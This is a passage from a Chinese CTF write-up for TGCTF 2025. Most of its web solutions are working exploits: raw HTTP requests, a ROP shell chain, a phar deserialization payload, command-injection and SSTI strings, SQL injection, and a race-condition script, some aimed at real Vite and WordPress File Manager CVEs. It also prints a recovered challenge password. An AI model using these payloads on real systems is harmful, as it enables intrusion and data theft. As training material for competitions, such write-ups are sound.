Um10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"; filename=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"\nContent-Type: application/octet-stream\n\n111\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B--\nPOST /class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt HTTP/1.1\nHost: node1.tgctf.woooo.tech:32439\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Length: 11\n\nwow=cat /f*\n```\n\n### 前端GAME\n\n紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。\n\n这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&raw??即可\n\n```\nhttp://node1.tgctf.woooo.tech:32360/@fs/tgflagggg?import&raw??\n```\n\n### 前端GAME plus\n\n参考[https://blog.meteorkai.top/2025/04/04/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31125/#%E6%9C%AA%E5%85%AC%E5%BC%80POC](https://blog.meteorkai.top/2025/04/04/Vite开发服务器任意文件读取漏洞分析复现-CVE-2025-31125/#未公开POC)\n\n```\n/@fs/tgflagggg?import&?meteorkai.svg?.wasm?init\n```\n\n### 火眼辩魑魅\n\nrobots.txt 直接打 tgshell.php\n\n无过滤，直接POST传cat /f*一把梭了\n\n### 熟悉的配方，熟悉的味道\n\n狠狠非预期！！！\n\n直接打盲注好吧。\n\n```python\nimport string\nimport requests\nfrom tqdm import tqdm\nurl = \"http://node1.tgctf.woooo.tech:30215\"\nflag = \"TGCTF{028b2d11-2783-464c-8cea-fda040\"\n\nfor i in range(len(flag),50):\n    # for s in 'TGCTF{':\n    for s in tqdm('-'+'}'+'{'+string.ascii_lowercase+string.digits):\n        data = {\"expr\":f\"import os,operator;f=os.popen('cat /f*').read();a=int(operator.eq(f[{i}],'{s}'));1/a\"}\n        # res = requests.post(url, data=json)\n        res = requests.post(url, data=data)\n        # print(res.text, s)\n        if res.text != \"A server error occurred.  Please contact the administrator.\":\n            flag += s\n            print(flag)\n            break\n    print(i)\n```\n\n只要flag逐位是对的上的就会触发1/0进而报错。否则就是1/1正常。布尔盲注打完了。\n\n### 直面天命\n\n/hints发现有路由。爆破。打到/aazz。可以传参。那就arjun扫。发现filename参数。\n\n路径穿越出。\n\nhttp://node2.tgctf.woooo.tech:32178/aazz?filename=../../../../../../flag\n\n### TG_wordpress\n\n/robots.txt进去。看到/.tmp/vuln和/.tmp/.bak。.bak发现服务器在52013开了vuln服务（nc可以连）\n\nret2syscall 直接ROPgadgets可以一把梭。\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\nio=process(\"./gets\")\n#io=remote()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\np = b\"A\"*40\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e0) # @ .data\np += p64(0x0000000000419484) # pop rax ; ret\np += b'/bin//sh'\np += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x000000000043d350) # xor rax, rax ; ret\np += p64(0x000000000044a5e5) # mov qword ptr [rsi], rax ; ret\np += p64(0x0000000000401f2f) # pop rdi ; ret\np += p64(0x00000000004c50e0) # @ .data\np += p64(0x0000000000409f9e) # pop rsi ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x000000000047f2eb) # pop rdx ; pop rbx ; ret\np += p64(0x00000000004c50e8) # @ .data + 8\np += p64(0x4141414141414141) # padding\np += p64(0x000000000043d350) # xor rax, rax ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000471350) # add rax, 1 ; ret\np += p64(0x0000000000401ce4) # syscall\nio.sendline(p)\nio.interactive()\n```\n\n打到账密。TG_wordpressor, aXx^oV@K&cFoVatzQ*\n\n进去之后发现filemanager 6.0。直接一眼顶针了。CVE-2020-25213。\n\n配置文件有过滤。可以使用如下绕过：\n\n```php\n<?= call_user_func('sys'.'tem', 'cat /f*'); ?>\n```\n\n打进去就有了。\n\n### AAA偷渡阴平（复仇）\n\n没有禁止session相关。\n\npayload:\n\n```http\nGET /?tgctf2025=session_id();session_start();system(hex2bin(session_id())); HTTP/1.1\nHost: node2.tgctf.woooo.tech:32385\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nCookie: PHPSESSID=636174202f662a\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n\n### 什么文件上传？（复仇）\n\nfile_exists可以出发phar。易得：\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass yesterday {\n    public $learn;\n    public $study=\"study\";\n    public $try;\n    public function __construct()\n    {\n        $this->learn = \"learn<br>\";\n    }\n    public function __destruct()\n    {\n        echo \"You studied hard yesterday.<br>\";\n        return $this->study->hard();\n    }\n}\nclass today {\n    public $doing;\n    public $did;\n    public $done;\n    public function __construct(){\n        $this->did = \"What you did makes you outstanding.<br>\";\n    }\n    public function __call($arg1, $arg2)\n    {\n        $this->done = \"And what you've done has given you a choice.<br>\";\n        echo $this->done;\n        if(md5(md5($this->doing))==666){\n            return $this->doing();\n        }\n        else{\n            return $this->doing->better;\n        }\n    }\n}\nclass tommoraw {\n    public $good;\n    public $bad;\n    public $soso;\n    public function __invoke(){\n        $this->good=\"You'll be good tommoraw!<br>\";\n        echo $this->good;\n    }\n    public function __get($arg1){\n        $this->bad=\"You'll be bad tommoraw!<br>\";\n    }\n\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;\n\n    public function __set($arg1, $arg2) {\n        if ($this->out->useful7) {\n            echo \"Seven is my lucky number<br>\";\n            system('whoami');\n        }\n    }\n    public function __toString(){\n        echo \"This is your future.<br>\";\n        system($_POST[\"wow\"]);\n        return \"win\";\n    }\n    public function __destruct(){\n        $this->no = \"no\";\n        return $this->no;\n    }\n}\n$a = new yesterday();\n$a -> study = new today();\n$a -> study -> doing = new future();\n\n// 后缀必须为phar\n$phar = new Phar(\"evil.phar\");\n$phar->startBuffering();\n// 设置 stubb\n$phar->setStub(\"GIF89a<?php __HALT_COMPILER(); ?>\");\n/**\n将自定义的 meta-data 存入 manifest\n这个函数需要在php.ini中修改 phar.readonly 为 Off\n否则的话会抛出 \ncreating archive \"***.phar\" disabled by the php.ini setting phar.readonly \n异常.\n*/\n$$phar->setMetadata($$a);\n// 添加需压缩的文件\n$phar->addFromString(\"test.txt\", \"test\");\n$phar->stopBuffering();\n\n?>\n```\n\n随后上传。在不是复仇那个版本读到uploads.php。发现源码如下：\n\n```php\n<?php\nif(isset($_FILES['file'])) {\n    $uploadDir = 'uploads/';\n    if(!file_exists($uploadDir)) {\n        mkdir($uploadDir, 0777, true);\n    }\n\n    // 白名单允许的扩展名\n    $allowedExtensions = ['atg'];\n    $fileName = basename($_FILES['file']['name']);\n    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n\n    // 检查文件扩展名\n    if(!in_array($fileExtension, $allowedExtensions)) {\n        die(\"hacker！\");\n    }\n\n    $uploadFile = $uploadDir . $fileName;\n\n    if(move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {\n        echo \"文件已保存到：$uploadFile ！\";\n    } else {\n        echo \"文件保存出错！\";\n    }\n}\n?>\n```\n\n允许上传atg文件。\n\n后面易得：\n\n```http\nPOST /upload.php HTTP/1.1\nHost: node1.tgctf.woooo.tech:30759\nContent-Length: 940\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:30759\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary1OUR0mqZmZ8AtAOc\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:30759/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary1OUR0mqZmZ8AtAOc\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.atg\"\nContent-Type: application/octet-stream\n\nGIF89a<?php __HALT_COMPILER(); ?>\n此处有不可见字符省略。内容为上述脚本生成的phar\nPOST /class.php?filename=phar://./uploads/evil.atg/test.txt HTTP/1.1\nHost: node1.tgctf.woooo.tech:30759\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length: 7\n\nwow=env\n```\n\n### TGCTF 2025 后台管理\n\n反斜杠转义字符串中的'，然后在password里打SQL注入。\n\n误打误撞试出来flag在flag表里（（（\n\n```http\nPOST /login HTTP/1.1\nHost: 124.71.147.99:9045\nContent-Length: 48\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://124.71.147.99:9045\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://124.71.147.99:9045/login\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\nusername=1\\&password=union select *,2 from flag#\n```\n\n在setcookie头看到flag。TGCTF{ac4ca16f-f1508c-000342}\n\n### 老登，炸鱼来了？\n\n竞争safe变量。\n\n```python\nimport aiohttp\nimport asyncio\nimport time\n\nclass Solver:\n    def __init__(self, baseUrl):\n        self.baseUrl = baseUrl\n        self.READ_FILE_ENDPOINT = f'{self.baseUrl}'\n        self.VALID_CHECK_PARAMETER = '/write?name=123.md&content=flag&format=markdown'\n        self.INVALID_CHECK_PARAMETER = '/read?name=../../../../../flag'\n        self.RACE_CONDITION_JOBS = 100\n\n    async def setSessionCookie(self, session):\n        await session.get(self.baseUrl)\n\n    async def raceValidationCheck(self, session, parameter):\n        url = f'{self.READ_FILE_ENDPOINT}{parameter}'\n        async with session.get(url) as response:\n            return await response.text()\n\n    async def raceCondition(self, session):\n        tasks = list()\n        for _ in range(self.RACE_CONDITION_JOBS):\n            tasks.append(self.raceValidationCheck(session, self.VALID_CHECK_PARAMETER))\n            tasks.append(self.raceValidationCheck(session, self.INVALID_CHECK_PARAMETER))\n        return await asyncio.gather(*tasks)\n\n    async def solve(self):\n        async with aiohttp.ClientSession() as session:\n            await asyncio.sleep(1) # wait for the reverse proxy creation\n\n            attempts = 1\n            finishedRaceConditionJobs = 0\n            while True:\n                print(f'[*] Attempts #{attempts} - Finished race condition jobs: {finishedRaceConditionJobs}', end='\\r')\n\n                results = await self.raceCondition(session)\n                attempts += 1\n                finishedRaceConditionJobs += self.RACE_CONDITION_JOBS\n                for result in results:\n                    print(result)\n                    if 'TGCTF{' not in result:\n                        continue\n\n                    print(f'\\n[+] We won the race window! Flag: {result.strip()}')\n                    exit(0)\n\nif name == '__main__':\n    baseUrl = 'http://node1.tgctf.woooo.tech:30308' # for local testing\n    # baseUrl = 'http://49.13.169.154:8088'\n    solver = Solver(baseUrl)\n\n    asyncio.run(solver.solve())\n```\n\n### 直面天命（复仇）\n\n直接去非复仇版本里读：\n\nhttp://node1.tgctf.woooo.tech:31514/aazz?filename=a/b/c/d/secret.py\n\nsecret_key = \"直面天命\"\n\n然后标准SSTI即可。unicode编码绕过。 。 \n\n```bash\n直面天命g['\\u0070\\u006f\\u0070']['\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f']['\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f']['\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f']('so'[::-1])['\\u0070\\u006f\\u0070\\u0065\\u006e']('cat /*')['\\u0072\\u0065\\u0061\\u0064']()难违\n```\n\n\n\n## Misc\n\n### next is the end\n\n手动打开文件夹，得到flag。\n\n![img](/images/1744633170179-41.png)\n\n### where_it_is\n\n百度识图找到另一个视角的正面图。\n\n![img](/images/1744633170179-42.png)\n\n可以模糊看出学校名前两个字**\"内湖\"**，结合原图的职业二字，在360地图搜索找到对应学校。\n\n![img](/images/1744633170179-43.png)\n\n旁边的站就是港墘站\n\nTGCTF{港墘站}\n\n### 你的运气是好是坏？\n\nCTF自然常数（。\n\nflag{114514}\n\n### TeamGipsy&ctfer\n\nvm运行虚拟机，发现有密码。\n\n在开机时按shift，再按e修改，把ro quiet splash $vt_handoff修改为rw init=/bin/bash，再按F10启动。\n\n然后找到用户名，修改密码为123即可。\n\n![img](/images/1744633170179-44.png)\n\n桌面存在一个mimi.txt记录着之前的指令，发现之前启了两个容器，并且有mysql数据库。\n\n![img](/images/1744633170179-45.png)\n\n重新start之前的docker，并且用文本文件里面的mysql密码连上flag，在其中一个docker的mysql数据库中可以找到flag。\n\n![img](/images/1744633170179-46.png)\n\n![img](/images/1744633170179-47.png)\n\nHZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}\n\n### 